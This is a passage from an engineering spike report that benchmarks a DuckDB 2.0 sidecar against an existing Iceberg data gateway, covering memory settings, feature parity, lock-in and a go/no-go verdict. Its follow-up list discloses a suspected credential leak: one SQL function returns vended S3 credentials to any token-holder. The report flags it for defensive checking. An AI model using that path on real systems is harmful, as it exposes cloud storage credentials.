`external_file_cache_*`, `streaming_buffer_size`=10 MiB, `preserve_insertion_order`=true; there is no setting named
`*async_io*`). One streaming run each, RSS MiB / wall s, t1 | t4:

| Knob | t1 | t4 |
|---|---|---|
| (streaming defaults, series median) | 440 / 1.15 | 550 / 1.15 |
| `enable_external_file_cache=false` | **256** / 1.00 | 371 / 1.09 |
| `read_ahead_depth=0` / `1` / `4` | 339 / 1.16, 339 / 1.10, 476 / 1.03 | 340 / 1.11, 322 / 1.13, 477 / 0.98 |
| `memory_limit=256MiB` | 377 / 1.16 | 388 / 0.89 |
| `async_threads=1` / `4` | 394 / 1.04, 440 / 0.93 | 552 / 0.91, 529 / 0.92 |
| `preserve_insertion_order=false` | 440 / 1.10 | 620 / 0.83 |
| `streaming_buffer_size=1MiB` | 431 / 1.11 | 560 / 0.82 |
| `disable_parquet_prefetching=true` | 159 / **2.76, 2 055 GETs** | 247 / **3.22, 2 089 GETs** |
| **external cache off + `read_ahead_depth=1`** | **143 / 1.06** | **143 / 1.02** |
| external cache off + `read_ahead_depth=0` | 146 / 1.06 | - |
| external cache off, t2 (read-ahead auto) | 363 / 2.03 (t2) | - |
| external cache off + read-ahead 1, + `memory_limit=256MiB` | 145 / 1.03 | 144 / 0.96 |

### Reading the numbers
- **Three stacked costs, three fixes.** For t4: (1) duckdb-go's materialized result costs about 540 MiB (1085 -> 550).
  The streaming C API removes it. (2) DuckDB 2.0's **external file cache** (on by default) keeps the fetched parquet
  blocks of remote files in the buffer pool, up to `memory_limit`. With it off, t1 drops 440 -> 256 MiB. (3) **Auto
  read-ahead** (`read_ahead_depth=-1`, "bound by a memory budget") queues decoded scan jobs ahead of the consumer. Depth
  1 (or 0) caps that queue. With (2) and (3) fixed, RSS is **143-144 MiB at 1, 2 and 4 threads**: thread count stops
  mattering, and wall does not get worse (1.02-1.07 s vs 1.15 s).
- **`memory_limit` is not the lever.** It caps the buffer pool, not the process. Alone it saves 60-160 MiB, and on top of
  the two knobs it adds nothing (143 -> 145).
- **Rejected knobs.** `disable_parquet_prefetching` gets RSS low (159 MiB) but turns 108 GETs into about 2 060 small
  range requests and makes the read 2.6-3× slower. On real S3 / GCS latency that would be worse. `async_threads`,
  `preserve_insertion_order` and `streaming_buffer_size` show no consistent effect (single runs, within load noise).
- **IPC encoding is free in memory.** The 590 MB Arrow IPC stream adds about 0.06 s and 0 MiB (each batch is encoded and
  dropped). Projection reads 31.7-40.9 MB in 26-29 GETs (vs 203 MB / 109 for `SELECT *`) at 89 MiB and 0.36 s. With the
  external cache off, the byte count varies between runs (Task 5 measured 33.2 MB with the cache on, filtered).
- **In-engine transforms.** An aggregate never decodes the unused columns: 16.4 MB fetched, about 100-113 MiB, 0.35 s.
  A full copy is a write, and its RSS follows Task 4's rule (about one buffered row group per writer thread, not
  `memory_limit`). With DuckDB's default row groups (about 379 k rows) that is 1.34-1.44 GiB at t4, 850 MiB at t2 and
  469 MiB at t1. With Task 4's R3 row-group size (229 376) it is **353 MiB at t1 (2.91 s)** and 587 MiB at t2
  (2.13 s). At t4 with `memory_limit` 256 MiB it fails with OOM instead of spilling, as in Task 4.

### Best achievable vs today

| Path | Wall s | RSS MiB (summed) | Notes |
|---|---|---|---|
| Gateway Arrow IPC read (Task 5) | 1.76 | 224 gateway + 23 client = **246** | decoded Arrow over HTTP |
| sql-transform today: gateway parquet passthrough, staged, then DuckDB `read_parquet` (Task 5) | 1.37 | 569 + 913 = **1481** | stage + decode |
| **Engine streaming read, best knobs, t1** | **1.04** | **143** | 0.59× gateway wall, 0.58× its summed RSS (0.64× gateway RSS alone) |
| Engine streaming read + IPC encode, t4 | 1.13 | 144 | what a sidecar serving Arrow over HTTP does; a reading component would add its own RSS (about 23 MiB in Task 5's client) |
| Engine in-engine aggregate (sql-transform-in-sidecar) | 0.35 | 102-113 | 0.26× sql-transform wall, 0.07× its RSS |
| Engine in-engine full copy, t1, R3 row groups | 2.91 | 353 | a write: 0.24× sql-transform's RSS, about 2× its read-only wall (it also writes 183 MB and commits) |

So reads are now cheaper than writes, as the maintainer expected: 143 MiB for a full decoded read vs 353-1438 MiB for a
copy, and 379 MiB summed for candidate A's L write at t1 (`## Extraction performance`).

### Findings and caveats
- **The fix is two settings plus a different C entry point.** `SET enable_external_file_cache=false; SET
  read_ahead_depth=1` (database-global), and `duckdb_pending_prepared_streaming` instead of duckdb-go's materializing
  path. In duckdb-go-bindings v0.20000.0, `PendingPreparedStreaming`, `StreamFetchChunk` and `ResultIsStreaming` carry
  `Deprecated` markers. `duckdb_fetch_chunk` (what duckdb-go already calls) also works on streaming results, so the only
  piece missing upstream is the streaming pending call. Observed quirk: at end of stream, `StreamFetchChunk` returns NULL
  with an empty error, not the documented size-0 chunk (`end_by_null_chunk: true` in every run).
- **One streaming result per connection.** It occupies its connection until drained. Concurrent readers need one
  connection each (`engine` pins `MaxConns 1`, and the lockdown is database-global).
- **Turning the external file cache off** costs nothing for a single scan (+0.3 MB, +1 GET). It removes reuse when the
  same remote files are read twice in one engine (for example sql-transform SQL that scans an input twice).
- **`read_ahead_depth=1` was measured only against local silo** (sub-millisecond latency). On real S3 / GCS, a shallow
  read-ahead may cost wall time. Re-measure there before fixing the value; depth 0 to 4 spans 322-477 MiB here.
- **New failure: INSERT into a freshly created table, intermittent.** An `INSERT ... SELECT` right after a zero-row CTAS
  (`WITH (zstd) AS SELECT * ... LIMIT 0`) failed in 2 of 5 runs with: `Invalid Configuration Error: Cannot reconstruct
  table ... at the transaction start because iceberg_use_metadata_log is enabled, but the table metadata does not contain
  a metadata-log`. Logs: `results/task5c/xform-copy-*.failed-series`, `logs/xform-copy-t4-r3.client.out`,
  `logs/xform-copy-best-t4-w0.client.out`. `SET iceberg_use_metadata_log=false` avoided it in all 15 later copies (one of them then failed with OOM), but
  it gives up the metadata-as-of-transaction-start isolation. Other workarounds (not tested): create the table with data
  (CTAS), or retry. This matters for any create-then-insert design, including candidate A's CREATE TABLE + INSERT
  (Task 4 did not report it).
- One host, local silo, load 1.2-6.4, single runs for knob and t1/t2 copy rows. RSS is process max RSS (`time -l`).

### Commands
```
cd spikes/duckdb-sidecar
CGO_ENABLED=1 go build -tags duckdb_arrow -o bin/readbench2 ./cmd/readbench2
read/task5c.sh base; read/task5c.sh stream; read/task5c.sh knobs 1; read/task5c.sh knobs 4
read/task5c.sh knob <threads> <cfg> -set "SET enable_external_file_cache = false;SET read_ahead_depth = 1"   # combos
TASK=task5c RB_BIN=readbench2 RB_CMD=eng read/run.sh series eng eng-full-stream-best-t4 3 base_l_r1 -mode stream -threads 4 \
    -set "SET enable_external_file_cache = false;SET read_ahead_depth = 1"          # likewise -sink ipc, -q proj
TASK=task5c RB_BIN=readbench2 RB_CMD=xform read/run.sh series eng xform-agg-t4 3 base_l_r1 -kind agg -threads 4
TASK=task5c RB_BIN=readbench2 RB_CMD=xform read/run.sh eng xform-copy-nml-best-r3props-t1 r1 base_l_r1 -kind copy -threads 1 \
    -set "SET iceberg_use_metadata_log = false;SET enable_external_file_cache = false;SET read_ahead_depth = 1" \
    -props "'write.parquet.compression-codec'='zstd','write.parquet.row-group-size'='229376','write.target-file-size-bytes'='134217728'"
read/summarize.py results/task5c > results/task5c/summary.md; read/task5c-table.py 'knob-*' > results/task5c/knobs.md
```
Raw data: `results/task5c/{<cfg>.jsonl,<cfg>.run.jsonl,summary.md,knobs.md,copy-single.md,settings-io.json,logs/}`.
`read/run.sh` gained one backward-compatible env var (`RB_BIN`). Fixture tables left: `t5c.agg_*` (8) and `t5c.copy_*`
(20, some empty from failed runs).

## Parity matrix

Q7. Written by the controller from Tasks 2-6, 5b, 5c and the gateway code on `main` (`ecff5c5`). **Native** = DuckDB 2.0 does
it; **wrapper** = Go in the sidecar (LOC is an estimate; "reuse" = existing gateway code moves over unchanged); **gap** =
no equivalent, with the workaround. "Untested" marks a row the spike did not exercise.

| Gateway feature | Status | Evidence / how |
|---|---|---|
| GetConfig + `$[name]` secret resolution | wrapper (reuse) | unchanged sidecar responsibility; no DuckDB involvement |
| Run-token JWT validation at boot | wrapper (reuse `pkg/datagateway/jwks`, `runtoken`, ~510 LOC) | Task 2 booted the real validator; the candidate skipped it (Footprint note) |
| Cancel annotation watch | wrapper (reuse `cancel_watch.go`) + context cancel of the running INSERT | untested; duckdb-go interrupts a statement on context cancel |
| Log / Shutdown RPCs | wrapper (reuse) | Task 4 candidate A serves them |
| OpenWriter: Arrow IPC | native (Arrow view → streaming INSERT) | Task 4 A, unmodified extractor, 1 snapshot per run |
| OpenWriter: JSON / CSV / Parquet | native (`read_json` / `read_csv` / `read_parquet`) behind a templated ingest | Task 4 B (JSON); CSV/Parquet untested |
| Schema inference from the first chunk | native | Task 4 A creates the table from the first Arrow batch's schema |
| Declared columns (`TableOutputConfig.columns`) | native + wrapper validation | Task 3 Q2g: explicit types work, but implicit casts are lossy (1.7 → 2, '42' → 42); the wrapper must check types before INSERT |
| Write-time TransformSpec + `drop` processors | native as SQL; wrapper translates the spec (~150 LOC) | untested; each op maps to a SELECT-list expression or WHERE |
| Output bucket/table allowlist | wrapper (the sidecar alone chooses the target table) | Task 6: impossible to enforce on component-supplied SQL; trivial when the component never sends SQL (A, B) |
| APPEND | native | Tasks 3-4: one INSERT statement = one snapshot; one REST commit per transaction |
| FULL_LOAD | **gap (partial)** | Task 3 Q2b: no single-snapshot overwrite; `DELETE` + `INSERT` in one transaction is atomic for readers but writes 2 snapshots + position deletes and leaves the old file live → periodic compaction (`iceberg_rewrite_data_files` exists in 2.0, untested) |
| Target file size / row group / codec | native via table properties | Task 3 R3: `write.parquet.compression-codec=zstd`, `row-group-size`, `target-file-size-bytes`; a table the sidecar did not create needs the properties set |
| Partition router | native (partition transforms since 1.5.3) | untested |
| files.json breadcrumb | wrapper (~40 LOC from the new snapshot's manifest) or drop | audit-only since RFC 021 |
| ExternalDataFile commits | **gap** | no "add existing files" in DuckDB-Iceberg; workaround `INSERT … SELECT FROM read_parquet(files)` rewrites the data; no current component needs it |
| Commit barrier + per-table results | wrapper (~100 LOC) | Task 4 A: statement-error tracking + `iceberg_snapshots()` after commit for snapshot id, files, rows, bytes |
| 409 conflict retry | native retries + wrapper outer retry | Task 3 Q2d: DuckDB rebases and retries; 1 of 100 batches still exhausted retries |
| Idempotency key | **gap** | Task 3 Q2e: no snapshot-summary property, no `Idempotency-Key` header; workaround: a table property written in the same transaction + a guarded retry (last writer wins) |
| Zero-path success | native | Task 3 Q2h: zero-row INSERT succeeds with no snapshot |
| OpenReader (full scan) | native + wrapper (streaming reader, ~150 LOC) | Task 5c: streaming + two settings, 1.04 s / 143 MiB vs gateway Arrow 1.76 s / 246 MiB summed; needs a streaming API that duckdb-go does not expose (own thin bindings or upstream) |
| Read-time transforms / projection | native SQL | Task 5c projection 0.36 s / 89 MiB, 33 MB fetched instead of 203 MB |
| Incremental reads + DeltaInfo | wrapper (~130 LOC, metadata-driven) — **better than today** | Task 5: gateway is a no-op in Lakekeeper mode (`server_v2_reading.go:46-52`); engine returns exactly the added rows and flags overwrite/delete as REQUIRES_FULL_REFRESH |
| GetSchema / GetSample | native (`DESCRIBE`, `LIMIT`) | trivial; untested |
| S3 with vended STS | native | Tasks 1-6 |
| GCS (WIF + service-account key) | **unknown** | not testable locally; DuckDB-Iceberg must accept Lakekeeper's vended GCS credentials — first thing to prove on a cluster |
| Metrics, profiling | wrapper (reuse) | DuckDB profiling is available; not wired |

**Code size.** The gateway is 14 075 non-test LOC (`pkg/datagateway`), plus `pkg/icebergjob` 591 (used only by the gateway)
and `pkg/catalogwriter` 1 290 (also used by pipeline-api's catalog proxy, so it stays). Rows marked native would retire
`format` 1 590, `buffer` 1 686, most of `backend` 4 421, `partition` 428, `schema` 648, `parquet_patcher` 264, `commit_pool`
292, `files_manifest` 226, `icebergjob` 591 and most of the `server_v2_*` writing/reading/commit code — roughly 10-11 k LOC.
The spike's candidate is 1 247 LOC (`cmd/sidecar` 958 + `internal/engine` 289) without auth, cancel, transforms or reads;
a production sidecar is plausibly 2.5-3.5 k LOC plus the reused auth/secrets/cancel code.

## Lock-in

Q8. What becomes DuckDB-specific depends on the component contract, not on the sidecar's internals.

- **Storage stays portable.** Tables are Iceberg in Lakekeeper. PyIceberg 0.12.0 reads every DuckDB-written table, v2 and v3
  (Task 5b); the one reader that failed, the gateway's pinned iceberg-go, fails because of its own bug (fixed in v0.7.0).
  DuckDB writes merge-on-read deletes, Puffin deletion vectors on v3, and ZSTD parquet: all standard Iceberg.
- **Candidate A (unchanged gRPC + HTTP Arrow IPC contract): no component lock-in.** Components and the SDK do not change;
  the engine is an implementation detail of the sidecar and can be swapped back (the Go gateway stays in git history) or
  for another engine. Reversal cost: the sidecar binary, nothing else.
- **Candidate B (files + templated ingest): weak lock-in.** The interface is "here is a file, insert it into output X";
  the parsing semantics (`read_json` type inference, CSV options) are DuckDB's, so a reversal must reimplement them.
- **Candidate C (Quack + component SQL): strong lock-in and unsafe** (Task 6 iii/iv). Rejected.
- **Engine-level dependencies the platform would take on:**
  - duckdb-go: the streaming read needs an API it does not expose (Task 5c used `unsafe` and deprecated binding calls).
  - DuckDB-Iceberg behaviours the wrapper must defend against:
    - COMMIT after a failed statement rolls back silently.
    - Create-then-insert flaked 2 of 5 times on `iceberg_use_metadata_log`.
    - No single-snapshot overwrite.
    - Every statement reloads the table.
  - Extension binaries are versioned per DuckDB release; the images already bake them offline (DuckDB 2.0 upgrade, Task 4).
  - DuckDB 2.0 is LTS until at least October 2027.

## Verdict

**GO for candidate A's shape**: a DuckDB 2.0 data plane inside the sidecar, behind the unchanged gRPC + HTTP Arrow IPC
component contract, as the next design spec, not a direct migration. Candidate B is a later opt-in fast path for
file-producing extractors. Candidate C is NO-GO.

Why:
- **Q4 passes with margin on the unmodified extractor.** These are interleaved medians on 2 M rows:

  | | Wall | Summed RSS |
  |---|---|---|
  | Baseline | 18.59 s | 645 MiB |
  | A | 15.36 s (0.83×) | 379 MiB (0.59×) |
  | B | 3.97 s | 531 MiB |
  | C | 3.65 s | 499 MiB |

  RSS stays flat at 10 M rows for every candidate.
- **Reads become cheaper than today once streamed** (Task 5c). A full scan takes 1.04 s / 143 MiB, against the gateway's
  1.76 s / 246 MiB and sql-transform's current 1.37 s / 1 481 MiB. A sql-transform that runs inside the sidecar never moves
  rows across a process boundary: an aggregate CTAS took 0.35 s / 102 MiB.
- **Parity is close.** The real gaps are FULL_LOAD (compaction debt), idempotency (workaround) and ExternalDataFile (unused).
  Incremental reads get better.
- **No storage lock-in**, and A keeps the component contract engine-neutral.

What a production design still has to prove:

1. **Lakekeeper authn + OpenFGA on a cluster.** Run tokens are validated, per-run `editor` tuples apply, cancellation by
   tuple deletion works; all were disabled locally.
2. **GCS** with Lakekeeper-vended credentials (WIF and service-account key).
3. **Linux / cgroup memory in a pod.** Pin `threads`: A met the RSS bar only at 1 thread (4 threads: 819 MiB; 8: 1 176 MiB),
   and `memory_limit` 256 MiB caused OOM failures instead of capping.
4. **Several output tables per run.** One streaming INSERT per table means one connection per table; multi-table atomicity
   is available (Task 3 Q2f) but costs that parallelism.
5. **Failure semantics.** Statement-error tracking, the `iceberg_use_metadata_log` flake, and the empty table a failed run
   leaves behind (2 Lakekeeper commits per new table instead of 1).
6. **FULL_LOAD compaction policy** (`iceberg_rewrite_data_files`), and an idempotency design for retried pods.
7. **A streaming read API**: upstream duckdb-go or a thin bindings layer.

Independent follow-ups found by the spike (valid whatever is decided here):
- **Bump iceberg-go to ≥ v0.7.0.** Today's gateway cannot read Iceberg tables from any writer that omits the
  manifest-list `format-version` key (Task 5b).
- **The gateway's `LoadTableForRead` appends every manifest entry to its data-file list without checking
  `manifest_content`.** Position-delete files from any engine's DELETE/MERGE would be read as data. Code reading only, not
  exercised (Task 5).
- **Check the shipped query-worker for `iceberg_load_table_response`.** It is a plain SELECT that returns the vended S3
  credentials of any table the token can load (Task 6 iii, proven on the writable sidecar). The query-worker's READ_ONLY
  attach does not obviously block it. If it works there, a viewer or app render can lift read credentials past the
  preview caps. Not verified on the query-worker.

Not covered by this spike: token validation and OpenFGA, GCS, Linux builds and cgroup accounting, real S3 latency for the
read-ahead settings, FULL_LOAD performance, multi-table runs, and concurrent sidecars. All numbers come from one Apple M3
host with background load 1.2-9.7.
